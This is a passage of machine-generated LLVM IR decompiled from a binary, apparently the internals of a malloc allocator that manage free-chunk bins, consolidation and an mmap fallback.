dec_label_pc_12420:                               ; preds = %dec_label_pc_124b8
  %v1_12420 = add i32 %v1_12448, 4
  %v2_12420 = inttoptr i32 %v1_12420 to i32*
  %v3_12420 = load i32, i32* %v2_12420, align 4
  store i32 %v3_12420, i32* %r3.global-to-local, align 4
  %v1_12424 = and i32 %v3_12420, -4
  store i32 %v1_12424, i32* %r2.global-to-local, align 4
  %v3_12428 = icmp ult i32 %v1_12424, %v0_12408
  %v1_1242c = add i32 %v1_12448, 12
  %v2_1242c = inttoptr i32 %v1_1242c to i32*
  %v3_1242c = load i32, i32* %v2_1242c, align 4
  store i32 %v3_1242c, i32* %r0.global-to-local, align 4
  br i1 %v3_12428, label %dec_label_pc_124b8, label %dec_label_pc_12434

dec_label_pc_12434:                               ; preds = %dec_label_pc_12420
  %v1_12434 = add i32 %v1_12448, 8
  %v2_12434 = inttoptr i32 %v1_12434 to i32*
  %v3_12434 = load i32, i32* %v2_12434, align 4
  store i32 %v3_12434, i32* %r1.global-to-local, align 4
  %v1_12438 = add i32 %v3_12434, 12
  %v2_12438 = inttoptr i32 %v1_12438 to i32*
  %v3_12438 = load i32, i32* %v2_12438, align 4
  store i32 %v3_12438, i32* %r3.global-to-local, align 4
  %v9_1243c = icmp eq i32 %v3_12438, %v1_12448
  br i1 %v9_1243c, label %dec_label_pc_12444, label %dec_label_pc_12450

dec_label_pc_12444:                               ; preds = %dec_label_pc_12434
  %v1_12444 = add i32 %v3_1242c, 8
  %v2_12444 = inttoptr i32 %v1_12444 to i32*
  %v3_12444 = load i32, i32* %v2_12444, align 4
  store i32 %v3_12444, i32* %r3.global-to-local, align 4
  %v9_12448 = icmp eq i32 %v3_12444, %v1_12448
  br i1 %v9_12448, label %dec_label_pc_12454, label %dec_label_pc_12450

dec_label_pc_12450:                               ; preds = %dec_label_pc_12434, %dec_label_pc_12444
  %v0_12450 = call i32 @abort()
  store i32 %v0_12450, i32* %r0.global-to-local, align 4
  %v0_12454.pre = load i32, i32* @sl, align 4
  %v1_12454.pre = load i32, i32* @r2, align 4
  %v0_1245c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_12454

dec_label_pc_12454:                               ; preds = %dec_label_pc_12444, %dec_label_pc_12450
  %v1_1245c = phi i32 [ %v3_1242c, %dec_label_pc_12444 ], [ %v0_12450, %dec_label_pc_12450 ]
  %v0_1245c = phi i32 [ %v3_12434, %dec_label_pc_12444 ], [ %v0_1245c.pre, %dec_label_pc_12450 ]
  %v1_12454 = phi i32 [ %v1_12424, %dec_label_pc_12444 ], [ %v1_12454.pre, %dec_label_pc_12450 ]
  %v0_12454 = phi i32 [ %v0_12408, %dec_label_pc_12444 ], [ %v0_12454.pre, %dec_label_pc_12450 ]
  %v2_12454 = sub i32 %v1_12454, %v0_12454
  store i32 %v2_12454, i32* %lr.global-to-local, align 4
  %v2_1245c = add i32 %v1_1245c, 8
  %v3_1245c = inttoptr i32 %v2_1245c to i32*
  store i32 %v0_1245c, i32* %v3_1245c, align 4
  %v0_12460 = load i32, i32* %r0.global-to-local, align 4
  %v1_12460 = load i32, i32* %r1.global-to-local, align 4
  %v2_12460 = add i32 %v1_12460, 12
  %v3_12460 = inttoptr i32 %v2_12460 to i32*
  store i32 %v0_12460, i32* %v3_12460, align 4
  %v0_12464 = load i32, i32* %ip.global-to-local, align 4
  %v1_12464 = add i32 %v0_12464, 8
  store i32 %v1_12464, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_12454, 15
  br i1 %tmp210, label %dec_label_pc_12484, label %dec_label_pc_1246c

dec_label_pc_1246c:                               ; preds = %dec_label_pc_12454
  %v1_1246c = load i32, i32* %r2.global-to-local, align 4
  %v2_1246c = add i32 %v1_1246c, %v0_12464
  store i32 %v2_1246c, i32* %r2.global-to-local, align 4
  %v1_12470 = add i32 %v2_1246c, 4
  %v2_12470 = inttoptr i32 %v1_12470 to i32*
  %v3_12470 = load i32, i32* %v2_12470, align 4
  store i32 %v3_12470, i32* %r3.global-to-local, align 4
  store i32 %v1_12464, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12478

dec_label_pc_12478.loopexit:                      ; preds = %dec_label_pc_12318
  %v1_12324 = load i32, i32* @r6, align 4
  %v2_12324 = load i32, i32* @sl, align 4
  %v3_12324 = add i32 %v2_12324, %v1_12324
  store i32 %v3_12324, i32* %r2.global-to-local, align 4
  %v2_12328 = add i32 %v3_12324, 4
  %v3_12328 = inttoptr i32 %v2_12328 to i32*
  %v4_12328 = load i32, i32* %v3_12328, align 4
  store i32 %v4_12328, i32* %r3.global-to-local, align 4
  %v2_1232c = add i32 %v1_12324, 8
  store i32 %v2_1232c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12478

dec_label_pc_12478:                               ; preds = %.dec_label_pc_12478_crit_edge, %dec_label_pc_12478.loopexit, %dec_label_pc_1246c
  %v1_1247c = phi i32 [ %v4_125a0, %.dec_label_pc_12478_crit_edge ], [ %v3_12324, %dec_label_pc_12478.loopexit ], [ %v2_1246c, %dec_label_pc_1246c ]
  %v0_12478 = phi i32 [ %v7_125a0, %.dec_label_pc_12478_crit_edge ], [ %v4_12328, %dec_label_pc_12478.loopexit ], [ %v3_12470, %dec_label_pc_1246c ]
  %v1_12478 = or i32 %v0_12478, 1
  store i32 %v1_12478, i32* %r3.global-to-local, align 4
  %v2_1247c = add i32 %v1_1247c, 4
  %v3_1247c = inttoptr i32 %v2_1247c to i32*
  store i32 %v1_12478, i32* %v3_1247c, align 4
  br label %dec_label_pc_12a40

dec_label_pc_12484:                               ; preds = %dec_label_pc_12454
  %v1_12484 = load i32, i32* @sl, align 4
  %v2_12484 = add i32 %v1_12484, %v0_12464
  store i32 %v2_12484, i32* %r2.global-to-local, align 4
  %v1_12488 = or i32 %v1_12484, 1
  store i32 %v1_12488, i32* %r3.global-to-local, align 4
  %v0_1248c = load i32, i32* %lr.global-to-local, align 4
  %v1_1248c = or i32 %v0_1248c, 1
  store i32 %v1_1248c, i32* %r1.global-to-local, align 4
  store i32 %v1_12464, i32* %r4.global-to-local, align 4
  %v2_12494 = add i32 %v0_12464, 4
  %v3_12494 = inttoptr i32 %v2_12494 to i32*
  store i32 %v1_12488, i32* %v3_12494, align 4
  %v0_12498 = load i32, i32* %r2.global-to-local, align 4
  %v1_12498 = load i32, i32* @r6, align 4
  %v2_12498 = add i32 %v1_12498, 8
  %v3_12498 = inttoptr i32 %v2_12498 to i32*
  store i32 %v0_12498, i32* %v3_12498, align 4
  %v0_1249c = load i32, i32* %r2.global-to-local, align 4
  %v1_1249c = load i32, i32* @r6, align 4
  %v2_1249c = add i32 %v1_1249c, 12
  %v3_1249c = inttoptr i32 %v2_1249c to i32*
  store i32 %v0_1249c, i32* %v3_1249c, align 4
  %v0_124a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_124a0 = load i32, i32* %r2.global-to-local, align 4
  %v3_124a0 = add i32 %v1_124a0, %v0_124a0
  %v4_124a0 = inttoptr i32 %v3_124a0 to i32*
  store i32 %v0_124a0, i32* %v4_124a0, align 4
  %v0_124a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_124a4 = load i32, i32* %r2.global-to-local, align 4
  %v2_124a4 = add i32 %v1_124a4, 4
  %v3_124a4 = inttoptr i32 %v2_124a4 to i32*
  store i32 %v0_124a4, i32* %v3_124a4, align 4
  %v0_124a8 = load i32, i32* @r6, align 4
  %v1_124a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_124a8 = add i32 %v1_124a8, 12
  %v3_124a8 = inttoptr i32 %v2_124a8 to i32*
  store i32 %v0_124a8, i32* %v3_124a8, align 4
  %v0_124ac = load i32, i32* @r6, align 4
  %v1_124ac = load i32, i32* %r2.global-to-local, align 4
  %v2_124ac = add i32 %v1_124ac, 8
  %v3_124ac = inttoptr i32 %v2_124ac to i32*
  store i32 %v0_124ac, i32* %v3_124ac, align 4
  br label %dec_label_pc_12a40

dec_label_pc_124b8:                               ; preds = %dec_label_pc_12420, %dec_label_pc_12410
  %v1_12448 = phi i32 [ %storemerge.pre, %dec_label_pc_12410 ], [ %v3_1242c, %dec_label_pc_12420 ]
  store i32 %v1_12448, i32* %ip.global-to-local, align 4
  %v9_124b8 = icmp eq i32 %v1_12448, %v1_12414
  br i1 %v9_124b8, label %dec_label_pc_124c0.loopexit, label %dec_label_pc_12420

dec_label_pc_124c0.loopexit:                      ; preds = %dec_label_pc_124b8
  br label %dec_label_pc_124c0

dec_label_pc_124c0:                               ; preds = %dec_label_pc_12408.dec_label_pc_124c0_crit_edge, %dec_label_pc_124c0.loopexit
  %v4_124f0.pre-phi = phi i32 [ %.pre203, %dec_label_pc_12408.dec_label_pc_124c0_crit_edge ], [ %v4_12410, %dec_label_pc_124c0.loopexit ]
  %v1_124c0 = add i32 %v0_124c0.pre, 1
  store i32 %v1_124c0, i32* %r2.global-to-local, align 4
  %v1_124c4 = urem i32 %v1_124c0, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r0.global-to-local, align 4
  %v6_124d0 = shl i32 1, %v1_124c4
  store i32 %v6_124d0, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_124d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v4_124d8, i32* %r3.global-to-local, align 4
  %v3_124dc = udiv i32 %v1_124c0, 32
  store i32 %v3_124dc, i32* @r5, align 4
  %v4_124e0 = mul nuw nsw i32 %v3_124dc, 4
  %v5_124e0 = add i32 %v4_124d8, %v4_124e0
  store i32 %v5_124e0, i32* %r2.global-to-local, align 4
  %v1_124e4 = add i32 %v5_124e0, 820
  %v2_124e4 = inttoptr i32 %v1_124e4 to i32*
  %v3_124e4 = load i32, i32* %v2_124e4, align 4
  store i32 %v3_124e4, i32* @r4, align 4
  %v1_124e8 = add i32 %v4_124d8, 52
  store i32 %v1_124e8, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_124f0 = add i32 %v1_124e8, %v4_124f0.pre-phi
  store i32 %v5_124f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_124f4

dec_label_pc_124f4:                               ; preds = %dec_label_pc_1255c, %dec_label_pc_124c0
  %v1_124fc = phi i32 [ %v1_124fc.pre, %dec_label_pc_1255c ], [ %v3_124e4, %dec_label_pc_124c0 ]
  %v0_124fc = phi i32 [ %v0_124f4.pre, %dec_label_pc_1255c ], [ %v6_124d0, %dec_label_pc_124c0 ]
  %v1_124f4 = sub i32 1, %v0_124fc
  %v2_124f4 = icmp ult i32 %v0_124fc, 2
  %v1_124f4. = select i1 %v2_124f4, i32 %v1_124f4, i32 0
  store i32 %v1_124f4., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_124fc, %v1_124fc
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_124f4
  %v5_12500 = or i32 %v1_124f4., 1
  store i32 %v5_12500, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1250c.preheader

bb145:                                            ; preds = %dec_label_pc_124f4
  %v2_12504 = icmp eq i32 %v1_124f4., 0
  br i1 %v2_12504, label %.dec_label_pc_12548.preheader_crit_edge, label %dec_label_pc_1250c.preheader

.dec_label_pc_12548.preheader_crit_edge:          ; preds = %bb145
  %v0_1254057.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12548.preheader

dec_label_pc_1250c.preheader:                     ; preds = %bb145, %.thread15
  %v0_1250c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1250c

dec_label_pc_1250c:                               ; preds = %dec_label_pc_1250c.preheader, %dec_label_pc_12518
  %v0_1250c = phi i32 [ %v0_1250c.pre, %dec_label_pc_1250c.preheader ], [ %v1_1250c, %dec_label_pc_12518 ]
  %v1_1250c = add i32 %v0_1250c, 1
  store i32 %v1_1250c, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_1250c, 2
  br i1 %tmp211, label %dec_label_pc_125ec.loopexit, label %dec_label_pc_12518

dec_label_pc_12518:                               ; preds = %dec_label_pc_1250c
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r3.global-to-local, align 4
  %v1_1251c = load i32, i32* @r8, align 4
  %v2_1251c = add i32 %v1_1251c, ptrtoint (i32* @global_var_22010.349 to i32)
  %v3_1251c = inttoptr i32 %v2_1251c to i32*
  %v4_1251c = load i32, i32* %v3_1251c, align 4
  store i32 %v4_1251c, i32* %r2.global-to-local, align 4
  %v4_12520 = mul i32 %v1_1250c, 4
  %v5_12520 = add i32 %v4_1251c, %v4_12520
  store i32 %v5_12520, i32* %r3.global-to-local, align 4
  %v1_12524 = add i32 %v5_12520, 820
  %v2_12524 = inttoptr i32 %v1_12524 to i32*
  %v3_12524 = load i32, i32* %v2_12524, align 4
  store i32 %v3_12524, i32* @r4, align 4
  %v2_12528 = icmp eq i32 %v3_12524, 0
  br i1 %v2_12528, label %dec_label_pc_1250c, label %dec_label_pc_12530

dec_label_pc_12530:                               ; preds = %dec_label_pc_12518
  %v4_12530 = mul i32 %v1_1250c, 256
  %v5_12530 = add i32 %v4_1251c, %v4_12530
  store i32 %v5_12530, i32* %r3.global-to-local, align 4
  %v1_12534 = add i32 %v5_12530, 44
  store i32 %v1_12534, i32* %r0.global-to-local, align 4
  %v0_12538 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12538, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12548.preheader

dec_label_pc_12548.preheader:                     ; preds = %.dec_label_pc_12548.preheader_crit_edge, %dec_label_pc_12530
  %v0_1254057 = phi i32 [ %v1_12534, %dec_label_pc_12530 ], [ %v0_1254057.pre, %.dec_label_pc_12548.preheader_crit_edge ]
  %v0_12564 = phi i32 [ %v3_12524, %dec_label_pc_12530 ], [ %v1_124fc, %.dec_label_pc_12548.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_12538, %dec_label_pc_12530 ], [ %v0_124fc, %.dec_label_pc_12548.preheader_crit_edge ]
  %v2_1254854 = and i32 %ip.promoted, %v0_12564
  %v4_1254856 = icmp eq i32 %v2_1254854, 0
  br i1 %v4_1254856, label %dec_label_pc_12540, label %dec_label_pc_12550

dec_label_pc_12540:                               ; preds = %dec_label_pc_12548.preheader, %dec_label_pc_12540
  %v2_1254459 = phi i32 [ %v2_12544, %dec_label_pc_12540 ], [ %ip.promoted, %dec_label_pc_12548.preheader ]
  %v0_1254058 = phi i32 [ %v1_12540, %dec_label_pc_12540 ], [ %v0_1254057, %dec_label_pc_12548.preheader ]
  %v1_12540 = add i32 %v0_1254058, 8
  %v2_12544 = mul i32 %v2_1254459, 2
  %v2_12548 = and i32 %v2_12544, %v0_12564
  %v4_12548 = icmp eq i32 %v2_12548, 0
  br i1 %v4_12548, label %dec_label_pc_12540, label %dec_label_pc_12548.dec_label_pc_12550_crit_edge

dec_label_pc_12548.dec_label_pc_12550_crit_edge:  ; preds = %dec_label_pc_12540
  store i32 %v1_12540, i32* %r0.global-to-local, align 4
  store i32 %v2_12544, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12550

dec_label_pc_12550:                               ; preds = %dec_label_pc_12548.dec_label_pc_12550_crit_edge, %dec_label_pc_12548.preheader
  %v0_12570 = phi i32 [ %v2_12544, %dec_label_pc_12548.dec_label_pc_12550_crit_edge ], [ %ip.promoted, %dec_label_pc_12548.preheader ]
  %v0_12594 = phi i32 [ %v1_12540, %dec_label_pc_12548.dec_label_pc_12550_crit_edge ], [ %v0_1254057, %dec_label_pc_12548.preheader ]
  %v1_12550 = add i32 %v0_12594, 12
  %v2_12550 = inttoptr i32 %v1_12550 to i32*
  %v3_12550 = load i32, i32* %v2_12550, align 4
  store i32 %v3_12550, i32* @lr, align 4
  %v9_12554 = icmp eq i32 %v3_12550, %v0_12594
  br i1 %v9_12554, label %dec_label_pc_1255c, label %dec_label_pc_1257c

dec_label_pc_1255c:                               ; preds = %dec_label_pc_12550
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r0.global-to-local, align 4
  %v1_12560 = load i32, i32* @r8, align 4
  %v2_12560 = add i32 %v1_12560, ptrtoint (i32* @global_var_22010.349 to i32)
  %v3_12560 = inttoptr i32 %v2_12560 to i32*
  %v4_12560 = load i32, i32* %v3_12560, align 4
  %v2_12564 = sub i32 -1, %v0_12570
  %v3_12564 = and i32 %v0_12564, %v2_12564
  store i32 %v3_12564, i32* @r4, align 4
  %v1_12568 = load i32, i32* @r5, align 4
  %v4_12568 = mul i32 %v1_12568, 4
  %v5_12568 = add i32 %v4_12568, %v4_12560
  store i32 %v5_12568, i32* %r3.global-to-local, align 4
  %v1_1256c = add i32 %v0_12594, 8
  store i32 %v1_1256c, i32* %r0.global-to-local, align 4
  %v2_12570 = mul i32 %v0_12570, 2
  store i32 %v2_12570, i32* %ip.global-to-local, align 4
  %v2_12574 = add i32 %v5_12568, 820
  %v3_12574 = inttoptr i32 %v2_12574 to i32*
  store i32 %v3_12564, i32* %v3_12574, align 4
  %v0_124f4.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_124fc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_124f4

dec_label_pc_1257c:                               ; preds = %dec_label_pc_12550
  %v1_1257c = add i32 %v3_12550, 4
  %v2_1257c = inttoptr i32 %v1_1257c to i32*
  %v3_1257c = load i32, i32* %v2_1257c, align 4
  store i32 %v3_1257c, i32* %r3.global-to-local, align 4
  %v1_12580 = and i32 %v3_1257c, -4
  store i32 %v1_12580, i32* %r2.global-to-local, align 4
  %v0_12584 = load i32, i32* @sl, align 4
  %v2_12584 = sub i32 %v1_12580, %v0_12584
  store i32 %v2_12584, i32* %ip.global-to-local, align 4
  %v1_12588 = add i32 %v3_12550, 12
  %v2_12588 = inttoptr i32 %v1_12588 to i32*
  %v3_12588 = load i32, i32* %v2_12588, align 4
  store i32 %v3_12588, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_12584, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_1257c
  %v6_12590 = add i32 %v1_12580, %v3_12550
  store i32 %v6_12590, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_1257c, %bb146
  %v2_12594 = add i32 %v3_12588, 8
  %v3_12594 = inttoptr i32 %v2_12594 to i32*
  store i32 %v0_12594, i32* %v3_12594, align 4
  %v0_12598 = load i32, i32* %r3.global-to-local, align 4
  %v1_12598 = load i32, i32* %r0.global-to-local, align 4
  %v2_12598 = add i32 %v1_12598, 12
  %v3_12598 = inttoptr i32 %v2_12598 to i32*
  store i32 %v0_12598, i32* %v3_12598, align 4
  %v4_1259c = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_12478_crit_edge, label %dec_label_pc_125a8

.dec_label_pc_12478_crit_edge:                    ; preds = %bb147
  %v5_1259c = add i32 %v4_1259c, 8
  store i32 %v5_1259c, i32* %r4.global-to-local, align 4
  %v4_125a0 = load i32, i32* %r2.global-to-local, align 4
  %v5_125a0 = add i32 %v4_125a0, 4
  %v6_125a0 = inttoptr i32 %v5_125a0 to i32*
  %v7_125a0 = load i32, i32* %v6_125a0, align 4
  store i32 %v7_125a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12478

dec_label_pc_125a8:                               ; preds = %bb147
  %v1_125a8 = load i32, i32* @sl, align 4
  %v2_125a8 = add i32 %v1_125a8, %v4_1259c
  store i32 %v2_125a8, i32* %r1.global-to-local, align 4
  %v1_125b0 = load i32, i32* @r6, align 4
  %v2_125b0 = add i32 %v1_125b0, 8
  %v3_125b0 = inttoptr i32 %v2_125b0 to i32*
  store i32 %v2_125a8, i32* %v3_125b0, align 4
  %v0_125b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_125b4 = load i32, i32* @r6, align 4
  %v2_125b4 = add i32 %v1_125b4, 12
  %v3_125b4 = inttoptr i32 %v2_125b4 to i32*
  store i32 %v0_125b4, i32* %v3_125b4, align 4
  %v0_125b8 = load i32, i32* @r6, align 4
  %v1_125b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_125b8 = add i32 %v1_125b8, 8
  %v3_125b8 = inttoptr i32 %v2_125b8 to i32*
  store i32 %v0_125b8, i32* %v3_125b8, align 4
  %v0_125bc = load i32, i32* @r6, align 4
  %v1_125bc = load i32, i32* %r1.global-to-local, align 4
  %v2_125bc = add i32 %v1_125bc, 12
  %v3_125bc = inttoptr i32 %v2_125bc to i32*
  store i32 %v0_125bc, i32* %v3_125bc, align 4
  %tmp213 = icmp ult i32 %v1_125a8, 256
  br i1 %tmp213, label %bb148, label %.thread124

bb148:                                            ; preds = %dec_label_pc_125a8
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r2.global-to-local, align 4
  %v8_125c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v8_125c8, i32* %r3.global-to-local, align 4
  %v4_125cc = load i32, i32* %r1.global-to-local, align 4
  %v6_125cc = add i32 %v8_125c8, 48
  %v7_125cc = inttoptr i32 %v6_125cc to i32*
  store i32 %v4_125cc, i32* %v7_125cc, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_125a8, %bb148
  %v0_125d0 = load i32, i32* @sl, align 4
  %v1_125d0 = or i32 %v0_125d0, 1
  store i32 %v1_125d0, i32* %r2.global-to-local, align 4
  %v0_125d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_125d4 = or i32 %v0_125d4, 1
  store i32 %v1_125d4, i32* %r3.global-to-local, align 4
  %v0_125d8 = load i32, i32* @lr, align 4
  %v1_125d8 = add i32 %v0_125d8, 8
  store i32 %v1_125d8, i32* %r4.global-to-local, align 4
  %v2_125dc = add i32 %v0_125d8, 4
  %v3_125dc = inttoptr i32 %v2_125dc to i32*
  store i32 %v1_125d0, i32* %v3_125dc, align 4
  %v0_125e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_125e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_125e0 = add i32 %v1_125e0, %v0_125e0
  %v4_125e0 = inttoptr i32 %v3_125e0 to i32*
  store i32 %v0_125e0, i32* %v4_125e0, align 4
  %v0_125e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_125e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_125e4 = add i32 %v1_125e4, 4
  %v3_125e4 = inttoptr i32 %v2_125e4 to i32*
  store i32 %v0_125e4, i32* %v3_125e4, align 4
  br label %dec_label_pc_12a40

dec_label_pc_125ec.loopexit:                      ; preds = %dec_label_pc_1250c
  br label %dec_label_pc_125ec

dec_label_pc_125ec:                               ; preds = %dec_label_pc_125ec.loopexit, %dec_label_pc_12200, %dec_label_pc_12208
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %ip.global-to-local, align 4
  %v4_125f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v4_125f4, i32* @r0, align 4
  %v1_125f8 = add i32 %v4_125f4, 44
  %v2_125f8 = inttoptr i32 %v1_125f8 to i32*
  %v3_125f8 = load i32, i32* %v2_125f8, align 4
  store i32 %v3_125f8, i32* %ip.global-to-local, align 4
  %v1_125fc = add i32 %v3_125f8, 4
  %v2_125fc = inttoptr i32 %v1_125fc to i32*
  %v3_125fc = load i32, i32* %v2_125fc, align 4
  %v0_12600 = load i32, i32* @sl, align 4
  %v1_12600 = add i32 %v0_12600, 16
  store i32 %v1_12600, i32* %r1.global-to-local, align 4
  %v1_12604 = and i32 %v3_125fc, -4
  store i32 %v1_12604, i32* %r3.global-to-local, align 4
  %v3_12608 = icmp ult i32 %v1_12604, %v1_12600
  br i1 %v3_12608, label %dec_label_pc_12638, label %dec_label_pc_12614

dec_label_pc_12614:                               ; preds = %dec_label_pc_125ec
  %v2_12614 = sub i32 %v1_12604, %v0_12600
  %v2_12618 = add i32 %v0_12600, %v3_125f8
  store i32 %v2_12618, i32* %r1.global-to-local, align 4
  %v1_1261c = or i32 %v2_12614, 1
  store i32 %v1_1261c, i32* %r3.global-to-local, align 4
  %v1_12620 = or i32 %v0_12600, 1
  store i32 %v1_12620, i32* %r2.global-to-local, align 4
  %v1_12624 = add i32 %v3_125f8, 8
  store i32 %v1_12624, i32* %r4.global-to-local, align 4
  store i32 %v1_12620, i32* %v2_125fc, align 4
  %v0_1262c = load i32, i32* %r1.global-to-local, align 4
  %v1_1262c = load i32, i32* @r0, align 4
  %v2_1262c = add i32 %v1_1262c, 44
  %v3_1262c = inttoptr i32 %v2_1262c to i32*
  store i32 %v0_1262c, i32* %v3_1262c, align 4
  %v0_12630 = load i32, i32* %r3.global-to-local, align 4
  %v1_12630 = load i32, i32* %r1.global-to-local, align 4
  %v2_12630 = add i32 %v1_12630, 4
  %v3_12630 = inttoptr i32 %v2_12630 to i32*
  store i32 %v0_12630, i32* %v3_12630, align 4
  br label %dec_label_pc_12a40

dec_label_pc_12638:                               ; preds = %dec_label_pc_125ec
  %v1_12638 = inttoptr i32 %v4_125f4 to i32*
  %v2_12638 = load i32, i32* %v1_12638, align 4
  store i32 %v2_12638, i32* %r3.global-to-local, align 4
  %v1_1263c = and i32 %v2_12638, 2
  store i32 %v1_1263c, i32* %ip.global-to-local, align 4
  %v2_1263c = icmp eq i32 %v1_1263c, 0
  %v1_12640 = add i32 %v4_125f4, 860
  %v2_12640 = inttoptr i32 %v1_12640 to i32*
  %v3_12640 = load i32, i32* %v2_12640, align 4
  store i32 %v3_12640, i32* %r1.global-to-local, align 4
  br i1 %v2_1263c, label %dec_label_pc_12658, label %dec_label_pc_12648

dec_label_pc_12648:                               ; preds = %dec_label_pc_12638
  %v0_12648 = call i32 @__malloc_consolidate()
  %v0_1264c = load i32, i32* @sl, align 4
  %v1_1264c = add i32 %v0_1264c, -7
  store i32 %v1_1264c, i32* @r0, align 4
  %v0_12650 = call i32 @malloc()
  store i32 %v0_12650, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12a3c

dec_label_pc_12658:                               ; preds = %dec_label_pc_12638
  %v1_12658 = add i32 %v4_125f4, 844
  %v2_12658 = inttoptr i32 %v1_12658 to i32*
  %v3_12658 = load i32, i32* %v2_12658, align 4
  store i32 %v3_12658, i32* %r3.global-to-local, align 4
  %v3_1265c = icmp ult i32 %v0_12600, %v3_12658
  %v1_12660 = add i32 %v3_12640, -1
  store i32 %v1_12660, i32* %sb.global-to-local, align 4
  br i1 %v3_1265c, label %dec_label_pc_12734, label %dec_label_pc_12668

dec_label_pc_12668:                               ; preds = %dec_label_pc_12658
  %v1_12668 = add i32 %v4_125f4, 852
  %v2_12668 = inttoptr i32 %v1_12668 to i32*
  %v3_12668 = load i32, i32* %v2_12668, align 4
  store i32 %v3_12668, i32* %r2.global-to-local, align 4
  %v1_1266c = add i32 %v4_125f4, 848
  %v2_1266c = inttoptr i32 %v1_1266c to i32*
  %v3_1266c = load i32, i32* %v2_1266c, align 4
  store i32 %v3_1266c, i32* %r3.global-to-local, align 4
  %v6_12674 = icmp slt i32 %v3_1266c, %v3_12668
  br i1 %v6_12674, label %dec_label_pc_12678, label %dec_label_pc_12734

dec_label_pc_12678:                               ; preds = %dec_label_pc_12668
  %v1_12678 = add i32 %v0_12600, 10
  %v2_1267c = add i32 %v1_12678, %v3_12640
  store i32 %v2_1267c, i32* %r3.global-to-local, align 4
  %v2_12680 = sub i32 0, %v3_12640
  %v3_12680 = and i32 %v2_1267c, %v2_12680
  store i32 %v3_12680, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_12680, %v0_12600
  br i1 %tmp214, label %dec_label_pc_1268c, label %dec_label_pc_12734

dec_label_pc_1268c:                               ; preds = %dec_label_pc_12678
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_12680, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_126a4 = call i32 @mmap(i32 0, i32 %v3_12680, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_126a4, i32* %r0.global-to-local, align 4
  %v7_126a8 = icmp eq i32 %v6_126a4, -1
  br i1 %v7_126a8, label %dec_label_pc_1268c.dec_label_pc_12734_crit_edge, label %dec_label_pc_126b0

dec_label_pc_1268c.dec_label_pc_12734_crit_edge:  ; preds = %dec_label_pc_1268c
  %v1_12758.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_12734

dec_label_pc_126b0:                               ; preds = %dec_label_pc_1268c
  %v1_126b0 = urem i32 %v6_126a4, 8
  store i32 %v1_126b0, i32* %r2.global-to-local, align 4
  %v2_126b0 = icmp eq i32 %v1_126b0, 0
  br i1 %v2_126b0, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_126b0
  %v2_126b4 = sub nsw i32 8, %v1_126b0
  store i32 %v2_126b4, i32* %r3.global-to-local, align 4
  %v2_126b8 = load i32, i32* @r4, align 4
  %v3_126b8 = sub i32 %v2_126b8, %v2_126b4
  %v3_126bc = add i32 %v2_126b4, %v6_126a4
  store i32 %v3_126bc, i32* %lr.global-to-local, align 4
  %v2_126c4 = or i32 %v3_126b8, 2
  store i32 %v2_126c4, i32* %r2.global-to-local, align 4
  %v5_126cc = inttoptr i32 %v3_126bc to i32*
  store i32 %v2_126b4, i32* %v5_126cc, align 4
  %v1_126d0 = load i32, i32* %r2.global-to-local, align 4
